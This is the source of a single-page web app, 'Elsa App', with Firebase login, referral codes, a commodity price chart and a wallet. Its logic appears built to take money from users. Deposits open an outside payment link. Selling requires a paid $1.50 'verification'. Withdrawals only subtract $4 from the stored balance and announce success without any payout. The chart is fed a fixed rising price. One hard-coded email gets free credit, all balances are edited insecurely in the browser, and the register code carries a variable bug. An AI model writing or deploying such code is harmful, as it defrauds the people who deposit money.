<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Elsa App</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
  <style>
    body { margin: 0; font-family: Arial, sans-serif; background: #000; color: gold; }
    .container { padding: 20px; }
    header { background: #111; padding: 15px; text-align: center; font-size: 24px; font-weight: bold; }
    .tabs { display: flex; position: fixed; bottom: 0; width: 100%; background: #111; }
    .tabs button { flex: 1; padding: 10px; border: none; background: #111; color: gold; font-size: 16px; }
    .section { display: none; padding: 20px; }
    .active { display: block; }
    input, button { width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }
    button { background: gold; color: black; font-weight: bold; }
    .hidden { display: none; }
    canvas { background: #111; margin-top: 20px; border-radius: 10px; }
  </style>
</head>
<body>
  <header>Elsa App</header>
  <div class="container">
    <div id="auth" class="section active">
      <h2>Login</h2>
      <input id="loginEmail" type="email" placeholder="Email">
      <input id="loginPassword" type="password" placeholder="Password">
      <button onclick="login()">Login</button>
      <p>Don't have an account? <a href="#" onclick="toggleSection('register')">Register</a></p>
    </div><div id="register" class="section">
  <h2>Register</h2>
  <input id="regEmail" type="email" placeholder="Email">
  <input id="regPassword" type="password" placeholder="Password">
  <input id="refCode" type="text" placeholder="Referral Code (optional)">
  <button onclick="register()">Register</button>
  <p>Have an account? <a href="#" onclick="toggleSection('auth')">Login</a></p>
</div>

<div id="market" class="section">
  <h2>Market</h2>
  <canvas id="chart" width="300" height="200"></canvas>
  <p>Current Price: $<span id="price">0.00</span></p>
  <button onclick="buyCommodity()">Buy for $2</button>
  <button onclick="sellCommodity()">Sell for $2.60</button>
</div>

<div id="wallet" class="section">
  <h2>Wallet</h2>
  <p>Email: <span id="userEmail"></span></p>
  <p>Balance: $<span id="balance">0.00</span></p>
  <p>Status: <span id="verifyStatus"></span></p>
  <button onclick="verifyUser()">Verify Account ($1.50)</button>
  <button onclick="depositFunds()">Deposit</button>
  <button onclick="withdrawFunds()">Withdraw</button>
</div>

<div id="profile" class="section">
  <h2>Profile</h2>
  <p>Referral Code: <input id="referralLink" readonly></p>
  <p>Referrals: <span id="referralCount">0</span>/8</p>
</div>

  </div>  <div class="tabs hidden" id="tabs">
    <button onclick="showSection('market')"><span class="material-icons">show_chart</span></button>
    <button onclick="showSection('wallet')"><span class="material-icons">account_balance_wallet</span></button>
    <button onclick="showSection('profile')"><span class="material-icons">person</span></button>
  </div>  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
    import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-auth.js";
    import { getFirestore, doc, getDoc, setDoc, updateDoc, onSnapshot, addDoc, collection, increment } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyC8kLmGOyODdlrvHId2Nz3opdpT0tvD5mk",
      projectId: "elsa-ab176",
      appId: "1:850786583459:android:5710287d8738f48e8e1016"
    };

    const app = initializeApp(firebaseConfig);
    const auth = getAuth();
    const db = getFirestore();

    const chartEl = document.getElementById("chart");
    let chart;

    onSnapshot(collection(db, "chart"), snapshot => {
      const data = snapshot.docs.map(doc => doc.data().price);
      if (chart) {
        chart.data.labels = data.map((_, i) => i);
        chart.data.datasets[0].data = data;
        chart.update();
        document.getElementById("price").textContent = data[data.length - 1].toFixed(2);
      }
    });

    function initChart() {
      chart = new Chart(chartEl, {
        type: 'line',
        data: {
          labels: [],
          datasets: [{
            label: 'Commodity Price',
            borderColor: 'gold',
            data: [],
            fill: false
          }]
        },
        options: { scales: { x: { display: false } } }
      });
    }

    function toggleSection(id) {
      document.querySelectorAll(".section").forEach(el => el.classList.remove("active"));
      document.getElementById(id).classList.add("active");
    }

    function showSection(id) {
      toggleSection(id);
    }

    async function login() {
      const email = loginEmail.value;
      const password = loginPassword.value;
      try {
        const user = await signInWithEmailAndPassword(auth, email, password);
        initUser(user.user);
      } catch (e) {
        alert("Login failed: " + e.message);
      }
    }

    async function register() {
      const email = regEmail.value;
      const password = regPassword.value;
      const refCode = refCode.value;
      const userCred = await createUserWithEmailAndPassword(auth, email, password);
      await setDoc(doc(db, "users", userCred.user.uid), {
        email,
        balance: email === "eluxxes@gmail.com" ? 10 : 0,
        verified: false,
        referrals: 0,
        referredBy: refCode || null
      });
      if (refCode) {
        const refUser = doc(db, "users", refCode);
        const refSnap = await getDoc(refUser);
        if (refSnap.exists()) {
          await updateDoc(refUser, { referrals: increment(1) });
        }
      }
      loginEmail.value = email;
      loginPassword.value = password;
      toggleSection('auth');
    }

    async function initUser(user) {
      document.getElementById("tabs").classList.remove("hidden");
      toggleSection("wallet");
      const ref = doc(db, "users", user.uid);
      const snap = await getDoc(ref);
      const data = snap.data();
      userEmail.textContent = data.email;
      balance.textContent = data.balance.toFixed(2);
      verifyStatus.textContent = data.verified ? "✅ Verified" : "Not Verified";
      referralLink.value = `${location.origin}?ref=${user.uid}`;
      referralCount.textContent = data.referrals;
    }

    async function verifyUser() {
      const user = auth.currentUser;
      const ref = doc(db, "users", user.uid);
      const snap = await getDoc(ref);
      const data = snap.data();
      if (data.balance >= 1.5) {
        await updateDoc(ref, { balance: data.balance - 1.5, verified: true });
        alert("Verification successful");
        verifyStatus.textContent = "✅ Verified";
      } else alert("Insufficient balance");
    }

    async function buyCommodity() {
      const user = auth.currentUser;
      const ref = doc(db, "users", user.uid);
      const snap = await getDoc(ref);
      const data = snap.data();
      if (data.balance >= 2) {
        await updateDoc(ref, { balance: data.balance - 2 });
        await addDoc(collection(db, "chart"), { price: 2.6, time: Date.now() });
        alert("Purchase successful");
      } else alert("Insufficient balance");
    }

    async function sellCommodity() {
      const user = auth.currentUser;
      const ref = doc(db, "users", user.uid);
      const snap = await getDoc(ref);
      const data = snap.data();
      if (data.verified) {
        await updateDoc(ref, { balance: data.balance + 2.6 });
        alert("Sale complete");
      } else alert("Only verified users can sell");
    }

    function depositFunds() {
      window.open("https://paystack.com/buy/lilzok-vjmgrv", "_blank");
    }

    async function withdrawFunds() {
      const user = auth.currentUser;
      const ref = doc(db, "users", user.uid);
      const snap = await getDoc(ref);
      const data = snap.data();
      if (data.balance >= 4) {
        await updateDoc(ref, { balance: data.balance - 4 });
        alert("Withdraw processed");
      } else alert("Minimum $4 required");
    }

    onAuthStateChanged(auth, user => {
      if (user) initUser(user);
    });

    window.login = login;
    window.register = register;
    window.verifyUser = verifyUser;
    window.buyCommodity = buyCommodity;
    window.sellCommodity = sellCommodity;
    window.depositFunds = depositFunds;
    window.withdrawFunds = withdrawFunds;

    initChart();
  </script></body>
</html>
